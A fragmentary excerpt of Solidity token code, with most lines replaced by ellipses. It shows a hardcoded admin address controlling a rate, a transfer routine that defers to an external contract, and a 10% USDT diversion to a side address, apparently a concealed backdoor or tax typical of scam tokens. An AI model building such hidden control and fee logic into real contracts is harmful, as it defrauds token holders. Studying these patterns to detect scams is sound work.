...
contract A  {
    ...
    function setRate(uint _rate) external {
        require(msg.sender == 0x2b984cB0301bdDAdd9c8Deed56fe689904477106,"no admin");
        rate  =_rate;
    }
...
contract Token is Ownable, IERC20Metadata {
    ...
    function _transfer(
        ...
        uint amount2 = TRANSFER(_Transfer)._transfer(sender,recipient,amount);
        ...
        if (usdts >= _maxusdt && !_swapping && sender != _pair) {
            ...
            IERC20(_back_token).transfer(_back2,usdts*10/100);//ba
        ...
        // }
            ...
            _balances[recipient] += amount2*95/100;
